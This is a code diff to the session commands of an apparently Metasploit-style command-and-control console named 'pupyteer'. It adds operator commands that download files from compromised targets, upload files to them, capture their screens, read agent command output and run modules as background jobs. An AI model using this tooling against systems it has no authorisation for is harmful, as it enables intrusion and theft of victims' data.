@@ -3,9 +3,17 @@
 Provides MSF-style session interaction:
 - sessions list — List all active sessions
 - sessions interact <id> — Interactive session shell
+- sessions results <id> — Output of commands the agent already answered
+- sessions download <id> <remote> [local] — Pull a file off the target
+- sessions upload <id> <local> <remote> — Push a file to the target
+- sessions screenshot <id> [local] — Capture the target's screen
 - sessions kill <id> — Kill session
 - sessions info <id> — Session details
-- sessions route <id> <module> — Run module on session
+- sessions rename <id> <name> — Relabel a session for operators
+- sessions tag <id> <tag> — Tag a session
+- sessions search <query> — Search sessions
+- sessions route <id> <module> [KEY=VALUE ...] [--background] — Run module on
+  session, inline (foreground) or as a tracked background job
 """
 from __future__ import annotations
 
@@ -14,7 +22,9 @@ import logging
 import time
 from typing import Any, Dict, List, Optional
 
+from pupyteer.server.sessions.capabilities import DEFAULT_MAX_LINE
 from pupyteer.server.sessions.manager import SessionState
+from pupyteer.server.sessions import transfer
 
 logger = logging.getLogger("pupyteer.tui.commands.sessions")
 
@@ -96,15 +106,247 @@ async def sessions_interact(tui: Any, args: List[str]) -> Dict[str, Any]:
                 continue
 
             cmd_id = await tui._engine.sessions.interact(session_id, cmd_line)
-            if cmd_id:
-                tui.render_success(f"Command queued (id: {cmd_id})")
-            else:
+            if not cmd_id:
                 tui.render_error("Failed to queue command.")
+                continue
+            output = await _await_command_result(
+                tui._engine, session_id, cmd_id, timeout=interaction_timeout(tui)
+            )
+            if output is None:
+                tui.render_warning(
+                    f"Command queued (id: {cmd_id}) — no reply yet. The agent "
+                    f"picks commands up on its next check-in; "
+                    f"'sessions results {session_id}' shows it later."
+                )
+            else:
+                _print_result(output)
         except (EOFError, KeyboardInterrupt):
             break
 
     print("  Interaction ended.")
     return {"status": "ok", "session_id": session_id}
+
+
+async def sessions_download(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Pull a file off the target, in chunks, and save it locally.
+
+    Usage: sessions download <id> <remote-path> [local-path]
+
+    The chunking itself lives in `server/sessions/transfer.py`, which the file
+    modules use too: two copies of a reassembly loop is two chances for one of
+    them to report bytes that never arrived.
+    """
+    import os
+
+    if len(args) < 2:
+        tui.render_error("Usage: sessions download <id> <remote> [local]")
+        return {"status": "error", "error": "Usage: sessions download <id> <remote> [local]"}
+
+    session_id, remote = args[0], args[1]
+    local = args[2] if len(args) > 2 else os.path.join(
+        ".", "downloads", os.path.basename(remote.replace("\\", "/").rstrip("/")) or "downloaded_file"
+    )
+
+    engine = tui._engine
+    if await engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    parent = os.path.dirname(os.path.abspath(local))
+    os.makedirs(parent, exist_ok=True)
+
+    def report(done: int, total: int) -> None:
+        tui.render_success(f"  {done}/{total} bytes")
+
+    # Written incrementally: a target-side file can be larger than the
+    # operator's memory, and each chunk is already on the wire.
+    with open(local, "wb") as sink:
+        outcome = await transfer.pull(
+            engine.sessions, session_id, remote, sink,
+            timeout=interaction_timeout(tui), progress=report)
+
+    if outcome["status"] != "ok":
+        tui.render_error(f"Download failed: {outcome['error']}")
+        return {"status": "error", "error": outcome["error"]}
+
+    tui.render_success(f"Saved {outcome['bytes']} bytes to {local}")
+    return {"status": "ok", "session_id": session_id, "local": local,
+            "bytes": outcome["bytes"]}
+
+
+async def sessions_upload(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Push a local file to the target in offset chunks.
+
+    Usage: sessions upload <id> <local-path> <remote-path>
+    """
+    import os
+
+    if len(args) < 3:
+        tui.render_error("Usage: sessions upload <id> <local> <remote>")
+        return {"status": "error", "error": "Usage: sessions upload <id> <local> <remote>"}
+
+    session_id, local, remote = args[0], args[1], args[2]
+    engine = tui._engine
+    if await engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    def report(done: int, total: int) -> None:
+        tui.render_success(f"  {done}/{total} bytes")
+
+    outcome = await transfer.push(
+        engine.sessions, session_id, local, remote,
+        timeout=interaction_timeout(tui), progress=report)
+
+    if outcome["status"] != "ok":
+        tui.render_error(f"Upload failed: {outcome['error']}")
+        return {"status": "error", "error": outcome["error"]}
+
+    tui.render_success(f"Uploaded {outcome['bytes']} bytes to {remote}")
+    return {"status": "ok", "session_id": session_id, "remote": remote,
+            "bytes": outcome["bytes"]}
+
+
+async def sessions_screenshot(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Capture the target's screen and save the image locally.
+
+    Usage: sessions screenshot <id> [local-path]
+    """
+    import base64
+    import json
+    import os
+    import time
+
+    if not args:
+        tui.render_error("Usage: sessions screenshot <id> [local]")
+        return {"status": "error", "error": "Usage: sessions screenshot <id> [local]"}
+
+    session_id = args[0]
+    local = args[1] if len(args) > 1 else os.path.join(
+        ".", "downloads", f"screenshot-{int(time.time())}.png"
+    )
+
+    engine = tui._engine
+    if await engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    answered = await _run_agent_command(
+        engine, session_id, json.dumps({"action": "screenshot"}), interaction_timeout(tui)
+    )
+    if answered.get("error"):
+        tui.render_error(answered["error"])
+        return {"status": "error", "error": answered["error"]}
+    raw = answered["output"]
+    if raw is None:
+        tui.render_error("Agent did not answer the capture request (still beacons?).")
+        return {"status": "error", "error": "screenshot timed out"}
+    try:
+        payload = json.loads(raw)
+    except json.JSONDecodeError:
+        tui.render_error(f"Agent returned an unreadable capture: {raw[:200]}")
+        return {"status": "error", "error": "unreadable capture"}
+    if "error" in payload:
+        # An agent built without --screenshot answers this way rather than
+        # pretending the capture happened.
+        tui.render_error(f"Capture failed: {payload['error']}")
+        return {"status": "error", "error": payload["error"]}
+
+    data = base64.b64decode(payload.get("data", ""))
+    if not data:
+        tui.render_error("Agent reported success but sent no image data.")
+        return {"status": "error", "error": "empty capture"}
+    parent = os.path.dirname(os.path.abspath(local))
+    os.makedirs(parent, exist_ok=True)
+    with open(local, "wb") as sink:
+        sink.write(data)
+
+    tui.render_success(f"Saved {len(data)}-byte screenshot to {local}")
+    return {"status": "ok", "session_id": session_id, "local": local, "bytes": len(data)}
+
+
+async def _run_agent_command(engine: Any, session_id: str, command: str, timeout: float) -> Dict[str, Any]:
+    """Queue one command and wait, returning ``{"command_id", "output"[, "error"]}``.
+
+    ``output`` is None when the agent never answered; ``error`` means the command
+    was not queued at all.
+    """
+    return await transfer.run_command(
+        engine.sessions, session_id, command, timeout=timeout)
+
+
+def interaction_timeout(tui: Any) -> float:
+    """How long to wait for a beacon that has not checked in yet."""
+    try:
+        configured = float(tui._engine.config.get("session.interact_timeout", 120))
+    except Exception:
+        configured = 120.0
+    return configured if configured > 0 else 120.0
+
+
+async def _await_command_result(
+    engine: Any, session_id: str, command_id: str, timeout: float
+) -> Optional[str]:
+    """Poll the session queue until the agent reports this command back.
+
+    Returns None if the deadline passes first — the agent may simply be
+    between beacons, which is not an error.
+    """
+    return await transfer.wait_for_command(
+        engine.sessions, session_id, command_id, timeout)
+
+
+def _print_result(output: str) -> None:
+    print()
+    for line in (output or "").splitlines() or [""]:
+        print(f"    {line}")
+    print()
+
+
+async def sessions_results(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Show command output the agent has already reported for a session.
+
+    Usage: sessions results <id> [--last N]
+    """
+    if not args:
+        tui.render_error("Usage: sessions results <id> [--last N]")
+        return {"status": "error", "error": "Usage: sessions results <id>"}
+
+    session_id = args[0]
+    last = 10
+    if "--last" in args:
+        try:
+            last = int(args[args.index("--last") + 1])
+        except (ValueError, IndexError):
+            tui.render_error("Invalid --last value")
+            return {"status": "error", "error": "Invalid --last"}
+
+    session = await tui._engine.sessions.get(session_id)
+    if not session:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    queue = await tui._engine.sessions.get_pending_commands(session_id)
+    entries = queue[-last:] if last > 0 else queue
+    if not entries:
+        tui.render_warning(f"No commands recorded for session {session_id}.")
+        return {"status": "ok", "session_id": session_id, "results": []}
+
+    print(f"\n  Session {session_id} — {len(entries)} command(s):\n")
+    for entry in entries:
+        status = entry.get("status", "?")
+        print(f"    [{entry.get('command_id', '?')}] ({status}) {entry.get('command', '')}")
+        if status == "completed":
+            for line in (entry.get("result") or "").splitlines():
+                print(f"        {line}")
+            if not (entry.get("result") or "").strip():
+                print("        (no output)")
+    print()
+    return {
+        "status": "ok",
+        "session_id": session_id,
+        "results": [dict(e) for e in entries],
+    }
 
 
 async def sessions_kill(tui: Any, args: List[str]) -> Dict[str, Any]:
@@ -120,7 +362,10 @@ async def sessions_kill(tui: Any, args: List[str]) -> Dict[str, Any]:
     ok = await tui._engine.sessions.kill(session_id)
 
     if ok:
-        tui.render_success(f"Session {session_id} killed.")
+        tui.render_success(
+            f"Session {session_id} killed — exit ordered; the agent stops on its "
+            f"next check-in."
+        )
         return {"status": "ok", "session_id": session_id}
     else:
         tui.render_error(f"Session not found: {session_id}")
@@ -144,6 +389,13 @@ async def sessions_info(tui: Any, args: List[str]) -> Dict[str, Any]:
         return {"status": "error", "error": f"Session not found: {session_id}"}
 
     d = session.to_dict()
+    # A blank field here is the answer to "what did I drop on this host", and
+    # reads like a bug rather than like a payload that could not say. Both
+    # defaults below are what the server then does with the session.
+    if not d.get("capabilities"):
+        d["capabilities"] = ["(none declared — shell commands only)"]
+    if not d.get("max_line"):
+        d["max_line"] = f"(undeclared — assumed {DEFAULT_MAX_LINE} bytes)"
     theme = tui._theme
     print(f"\n  Session Details:")
     for key, val in d.items():
@@ -152,32 +404,151 @@ async def sessions_info(tui: Any, args: List[str]) -> Dict[str, Any]:
     return {"status": "ok", "session": d}
 
 
+async def sessions_rename(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Rename a session's operator-visible hostname label.
+
+    Usage: sessions rename <id> <name>
+    """
+    if len(args) < 2:
+        tui.render_error("Usage: sessions rename <id> <name>")
+        return {"status": "error", "error": "Usage: sessions rename <id> <name>"}
+
+    session_id, new_name = args[0], " ".join(args[1:])
+    if await tui._engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    if not await tui._engine.sessions.rename(session_id, new_name):
+        tui.render_error(f"Rename failed for session: {session_id}")
+        return {"status": "error", "error": "Rename failed"}
+
+    tui.render_success(f"Session {session_id} renamed to '{new_name}'")
+    return {"status": "ok", "session_id": session_id, "name": new_name}
+
+
+async def sessions_tag(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Add tags to a session.
+
+    Usage: sessions tag <id> <tag> [tag...]
+    """
+    if len(args) < 2:
+        tui.render_error("Usage: sessions tag <id> <tag> [tag...]")
+        return {"status": "error", "error": "Usage: sessions tag <id> <tag>"}
+
+    session_id = args[0]
+    tags = args[1:]
+    if await tui._engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    if not await tui._engine.sessions.tag(session_id, tags):
+        tui.render_error(f"Tagging failed for session: {session_id}")
+        return {"status": "error", "error": "Tagging failed"}
+
+    session = await tui._engine.sessions.get(session_id)
+    shown = ", ".join(session.tags) if session else ", ".join(tags)
+    tui.render_success(f"Tags on {session_id}: {shown}")
+    return {"status": "ok", "session_id": session_id, "tags": tags}
+
+
+async def sessions_search(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Search sessions by hostname, user, OS or tag.
+
+    Usage: sessions search <query>
+    """
+    if not args:
+        tui.render_error("Usage: sessions search <query>")
+        return {"status": "error", "error": "Usage: sessions search <query>"}
+
+    query = " ".join(args)
+    matches = await tui._engine.sessions.search(query)
+
+    if not matches:
+        tui.render_warning(f"No sessions matching '{query}'.")
+        return {"status": "ok", "query": query, "count": 0, "sessions": []}
+
+    headers = ["ID", "Hostname", "OS", "User", "Status", "Tags"]
+    rows = [
+        [s.session_id[:12], s.hostname[:20], s.os[:10], s.username[:12], s.state.value, ", ".join(s.tags[:3])]
+        for s in matches
+    ]
+    tui.render_table(headers, rows)
+    print(f"\n  {len(matches)} session(s) matching '{query}'")
+    return {"status": "ok", "query": query, "count": len(matches), "sessions": [s.to_dict() for s in matches]}
+
+
+async def _route_background(
+    tui: Any,
+    session_id: str,
+    module_name: str,
+    base_args: Dict[str, Any],
+    extra_tokens: List[str],
+) -> Dict[str, Any]:
+    """Launch a module run as a tracked job on the engine's ``ModuleExecutor``.
+
+    The executor dispatches through the same registry the foreground path uses
+    and owns the job record, so ``jobs list``/``jobs info`` report its real
+    status and ``jobs kill`` can actually cancel it.
+    """
+    module_args = dict(base_args)
+    for token in extra_tokens:
+        key, sep, value = token.partition("=")
+        if sep and key.strip():
+            module_args[key.strip()] = value
+
+    executor = tui._engine.modules
+    try:
+        job_id = await executor.execute_job(module_name, session_id, module_args)
+    except Exception as exc:
+        tui.render_error(f"Could not start background job: {exc}")
+        return {"status": "error", "error": f"Could not start background job: {exc}"}
+
+    tui.render_success(
+        f"Background job {job_id} started for module '{module_name}' "
+        f"on session {session_id}. Track it with 'jobs list' / 'jobs info {job_id}'.")
+    return {
+        "status": "ok",
+        "job_id": job_id,
+        "session_id": session_id,
+        "module": module_name,
+        "background": True,
+        "data": {
+            "job_id": job_id,
+            "module": module_name,
+            "session": session_id,
+            "state": "pending — poll 'jobs list'",
+        },
+    }
+
+
 async def sessions_route(tui: Any, args: List[str]) -> Dict[str, Any]:
     """Run a module on a session.
 
-    Usage: sessions route <id> <module>
+    Usage: sessions route <id> <module> [KEY=VALUE ...] [--background]
 
-    Dispatches the specified module against the given session.
+    Dispatches the specified module against the given session. Without
+    ``--background`` the module runs inline and its answer is rendered here,
+    exactly as before. With ``--background`` the run is handed to the engine's
+    ``ModuleExecutor`` as a tracked job that returns immediately; ``jobs list``
+    then shows its real status and ``jobs kill`` can cancel it.
     """
-    if len(args) < 2:
-        tui.render_error("Usage: sessions route <id> <module>")
+    background = "--background" in args
+    positional = [a for a in args if a != "--background"]
+
+    if len(positional) < 2:
+        tui.render_error(
+            "Usage: sessions route <id> <module> [KEY=VALUE ...] [--background]")
         return {"status": "error", "error": "Usage: sessions route <id> <module>"}
 
-    session_id = args[0]
-    module_name = args[1]
+    session_id = positional[0]
+    module_name = positional[1]
 
     session = await tui._engine.sessions.get(session_id)
     if not session:
         tui.render_error(f"Session not found: {session_id}")
         return {"status": "error", "error": f"Session not found: {session_id}"}
 
-    # Get module registry from engine
-    registry = getattr(tui._engine, '_modules_registry', None)
-    if registry is None:
-        from pupyteer.server.modules.registry import ModuleRegistry
-        registry = ModuleRegistry(tui._engine.config, tui._engine.audit)
-        registry.discover()
-        tui._engine._modules_registry = registry
+    registry = tui._engine.module_registry
 
     # Build args from session context
     args_dict = {
@@ -188,14 +559,36 @@ async def sessions_route(tui: Any, args: List[str]) -> Dict[str, Any]:
         "SESSION_USER": session.username,
     }
 
-    result = await registry.execute(module_name, session, args_dict)
+    if background:
+        return await _route_background(
+            tui, session_id, module_name, args_dict, positional[2:])
+
+    result = await registry.execute(
+        module_name, session, args_dict,
+        session_manager=tui._engine.sessions)
 
     if result.get("status") == "ok":
-        tui.render_success(f"Module '{module_name}' executed on session {session_id}")
+        tui.render_success(
+            f"Module '{module_name}' executed on session {session_id}")
     else:
         tui.render_error(f"Module execution failed: {result.get('error', 'unknown')}")
 
-    return {"status": result.get("status", "error"), "module": module_name, "session_id": session_id, "result": result}
+    # `_render_msf_result` prints what it is handed, so the answer has to be at
+    # this level: a module that ran but whose output stayed one dict deeper reads
+    # to the operator exactly like one that found nothing.
+    envelope: Dict[str, Any] = {
+        "status": result.get("status", "error"),
+        "module": module_name,
+        "session_id": session_id,
+        "result": result,
+    }
+    if result.get("status") == "ok":
+        envelope["data"] = {
+            k: v for k, v in result.items() if k not in ("status", "error")
+        }
+    else:
+        envelope["error"] = result.get("error", "unknown")
+    return envelope
 
 
 # ─── Command Mapping ─────────────────────────────────────────────────
@@ -205,5 +598,8 @@ COMMANDS: Dict[str, Any] = {
     "sessions interact": sessions_interact,
     "sessions kill": sessions_kill,
     "sessions info": sessions_info,
+    "sessions rename": sessions_rename,
+    "sessions tag": sessions_tag,
+    "sessions search": sessions_search,
     "sessions route": sessions_route,
 }
